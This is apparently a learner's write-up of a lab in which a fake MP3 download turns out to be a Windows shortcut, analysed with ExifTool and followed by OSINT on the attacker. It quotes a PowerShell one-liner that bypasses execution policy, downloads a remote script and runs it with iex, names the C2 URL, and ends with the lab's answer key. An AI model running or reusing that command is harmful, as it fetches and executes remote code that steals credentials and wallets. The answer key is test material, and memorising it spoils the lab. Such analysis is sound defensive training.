**Investigating the Suspicious Website**

The suspicious website I analyzed was a YouTube-to-MP3 converter. These types of websites are often associated with various cyber threats, such as:

*Malvertising*: Using malicious ads to exploit vulnerabilities.

*Phishing Scams*: Tricking users into giving away sensitive information.

*Bundled Malware*: Hiding harmful software in downloads that seem legitimate.

**What I Did**:

I visited the website using the provided IP address.

To test it, I submitted a YouTube link (like this classic video).

I downloaded the output file, download.zip, and extracted its contents.

**Analyzing the Files**

Inside the extracted folder, I found two files: song.mp3 and somg.mp3. To figure out what they were, I used the file command:

*song.mp3*: A normal MP3 file with no issues.

*somg.mp3*: A Windows shortcut (.lnk) file pretending to be an MP3. Shortcut files can execute commands, so they’re often used for malicious purposes. This caught my attention, and I decided to dig deeper.

**Investigating the .lnk File with ExifTool**

To analyze the metadata of somg.mp3, I used ExifTool, a tool for extracting detailed file information. Here’s the command I ran:

`exiftool somg.mp3`

**What I Found:**

**Command Line Arguments**:
`-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('<URL>', 'C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"`

`-ep Bypass -nop`: These flags disable PowerShell’s security restrictions.

`DownloadFile`: This command downloads a malicious script (IS.ps1) from a remote server.

`iex`: Executes the downloaded script.

**Malicious URL**:

The file was fetching a script from this URL:
`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`

**Understanding the Malicious Script**

The PowerShell script, once analyzed, was performing several harmful activities:

Stealing Information: It searched for cryptocurrency wallets and saved browser credentials.

Data Exfiltration: The stolen data was sent to a Command-and-Control (C2) server.

Attacker Signature: The script contained an ASCII art signature:

Created by the one and only M.M.

This signature gave me a valuable clue about the attacker’s identity.

**Tracking the Attacker: OPSEC Mistakes**

I used the signature, “Created by the one and only M.M.,” as a starting point for my search. A quick look on GitHub revealed repositories and discussions tied to the attacker. Here are some OPSEC mistakes I noticed:

*Reused Username*: The attacker used “M.M.” across multiple platforms, making them easier to trace.

*GitHub Activity*: Their public GitHub posts included identifiable information.

*Metadata*: The signature embedded in the script directly linked back to their online accounts.

**Real-Life OPSEC Failures**

To give a broader perspective, here are two famous examples of OPSEC failures:

*AlphaBay Admin*:

Reused the same email and usernames on different platforms.

Cashed out using identifiable Bitcoin wallets.

*APT1 (a Chinese Hacking Group)*:

Used predictable naming schemes in their operations.

Conducted attacks during Beijing business hours, revealing their location.

**Wrapping Up**

By analyzing malicious files, paying attention to OPSEC mistakes, and tracing digital footprints, I was able to uncover critical details about the attacker. In this case, the sloppy operational security of “M.M.” made it possible to identify them. Investigations like this show how even small clues can unravel a larger story, giving beginners like you and me the confidence to dive into cybersecurity investigations.

**Answers**

*Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?* **Tyler Ramsbey**

*The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?* **http://papash3ll.thm/data**

*Who is M.M? Maybe his Github profile page would provide clues?* **Mayor Malware**

*What is the number of commits on the GitHub repo where the issue was raised?* **1**
